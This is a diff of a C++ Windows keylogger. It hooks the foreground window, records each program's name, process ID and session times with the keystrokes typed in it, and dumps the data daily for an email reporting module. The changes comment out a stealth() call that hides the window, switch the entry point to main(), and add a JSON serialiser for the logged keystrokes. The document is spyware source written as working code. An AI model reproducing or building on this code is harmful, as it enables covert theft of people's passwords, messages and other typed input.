@@ -95,7 +95,7 @@ void pause(int dur) {
 // thread used to monitor keystrokes
 DWORD WINAPI mythread(LPVOID lpParameter) {
     // hide window
-    stealth();
+    //stealth();
 
     char i;
     BOOL sendReport = false;
@@ -112,6 +112,7 @@ DWORD WINAPI mythread(LPVOID lpParameter) {
             if(timeToProcess && !sendReport) {
                 // call dumpday
                 dataManager.DumpDay();
+
                 emailManager.readAnalysisResults();
                 
                 sendReport = true;
@@ -134,6 +135,11 @@ DWORD WINAPI mythread(LPVOID lpParameter) {
             }
         }
     }
+}
+
+string Entry::toString() {
+	string temp = "{\"active_process\": \"" + programName + "\", \"process_id\": \"" + procid + "\", \"start_time\": \"" + startTime + "\", \"end_time\": \"" + endTime + "\", \"session_duration\": \"" + duration + "\", \"logged_keystrokes\": \"" + text + "\"}";
+	return temp;
 }
 
 // function triggered whenever a window becomes active
@@ -161,13 +167,23 @@ void CALLBACK HandleWinEvent(HWINEVENTHOOK hook, DWORD event, HWND hwnd, LONG id
     if(theCount > 0) {
         time_t duration = rawEndTime - rawStartTime;
 
+		std::stringstream ss;
+		ss << duration;
+		std::string ts = ss.str();
+
+		std::stringstream dd;
+		dd << dwPID;
+		std::string ds = dd.str();
+
         // store info in Entry Object
         dataEntry.startTime = startTime;
         dataEntry.endTime = endTime;
-        dataEntry.duration = duration;
+        dataEntry.duration = ts;
         dataEntry.text = loggedKeystrokes;
         dataEntry.programName = wnd_title;
-        dataEntry.procid = dwPID;
+        dataEntry.procid = ds;
+
+		//cout << "{\"active_process\": \"" << wnd_title << "\", \"process_id\": \"" << dwPID << "\", \"start_time\": \"" << startTime << "\", \"end_time\": \"" << endTime << "\", \"session_duration\": \"" << duration << "\", \"logged_keystrokes\": \"" << loggedKeystrokes << "\"}";
 
         // call put
         dataManager.put(dataEntry);
@@ -190,12 +206,14 @@ void getWindows() {
 // initialize keylog thread and event hook for active window monitoring
 void init() {
     HWINEVENTHOOK hook;
+	dataManager.init();
     hook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND , EVENT_SYSTEM_FOREGROUND ,NULL, HandleWinEvent, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
     myhandle = CreateThread(0, 0, mythread, 0, 0, &mythreadid);
     getWindows();
 }
 
-int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
+//int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
+int main()
 {
 	init();
 	return 0;
